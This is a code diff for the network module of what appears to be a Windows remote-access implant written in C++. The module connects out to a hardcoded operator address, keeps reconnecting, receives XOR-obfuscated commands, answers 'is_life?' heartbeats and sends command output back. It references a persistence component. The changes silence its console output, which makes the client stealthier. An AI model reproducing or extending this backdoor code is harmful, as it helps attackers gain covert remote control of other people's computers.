@@ -1,5 +1,6 @@
 //#define WIN32_LEAN_AND_MEAN
 
+
 #include "../inc/Connexion.h"
 #include "../inc/common.h"
 #include "../inc/Persistence.h"
@@ -9,10 +10,13 @@
 
 using namespace std;
 
+
 Connexion::Connexion()
 {
     ;
 } //Constructor
+
+
 int Connexion::openConnexion()
 {     
     Sleep(500);
@@ -24,25 +28,26 @@ int Connexion::openConnexion()
 
 //     SOCKADDR_IN address_client_tmp;
     sock_client = sock; //Find one alternativ
-    cout <<"SOCKET: " <<sock << endl;
+    //cout <<"SOCKET: " <<sock << endl;
     //cout <<"after socket sock: " <<sock_client <<endl;
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
     sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
     //sock_client = socket(AF_INET, SOCK_STREAM, 0);
-    cout <<"SOCK CREATE" <<endl;
+    //cout <<"SOCK CREATE" <<endl;
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
 
     while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
     {   
-        Sleep(1000);
-        cout << "Whait...." <<endl;  
+        Sleep(TIMEOUT_SOCK_RECONNECT);
+        //cout << "Whait...." <<endl;  
     } 
     return 0;
 }
+
 
 int Connexion::main(bool is_admin, string path_prog)
 {   
@@ -59,12 +64,13 @@ int Connexion::main(bool is_admin, string path_prog)
     while(true)
     {
         //Sleep(1000);
-        cout << "in main...." << endl;
+        //cout << "in main...." << endl;
         command = recvSafe(); //Recv safe and decrypt xor
 
         if(command.find("is_life?") != string::npos)
         {
-            cout << "is life find baby" << endl; // if find is_life then continue
+            ;
+            //cout << "is life find baby" << endl; // if find is_life then continue
         }
         else
         {
@@ -192,19 +198,20 @@ Once the function is finished send "\r\n" to signal to the server that the clien
     //cout << "size of result " << result_of_command.size() << endl;
     if(result_of_command.size() >= 1) 
     {        
-        cout << "Multiple request: " << endl;
+        // Multiple request: 
         for(i=0;i< result_of_command.size(); i++)
         {
             
             request = result_of_command[i];
             
             send(sock_client, XOREncryption(request).c_str(), request.length(),0);
-            
+            /*
             cout << request << endl;
             cout << "size of request: " << result_of_command[i].length() << endl;
             cout << "I: " <<i <<endl;
             cout << "---------------------------\n\n" << endl;
-            //cout<<  XOREncryption(request) << endl;
+            cout<<  XOREncryption(request) << endl;
+            */
             size_all_result_of_command += request.length();
         
             Sleep(100);   
@@ -213,8 +220,8 @@ Once the function is finished send "\r\n" to signal to the server that the clien
 
     else
     {
-        cout << "singel request..." << endl;
-        cout << "size of request: " << result_of_command[i].length() << endl;
+        //cout << "singel request..." << endl;
+        //cout << "size of request: " << result_of_command[i].length() << endl;
         request = result_of_command[0];
 
         iResult = send(sock_client, XOREncryption(request).c_str(), request.length(),0);
@@ -258,7 +265,7 @@ void Connexion::closeConnexion()
 void Connexion::reConnect()
 {   
     string request;
-    cout << "GO TO RECO..." << endl;
+    //cout << "GO TO RECO..." << endl;
     //if the client has a token then reconnects without handshaking
 
     closeConnexion();
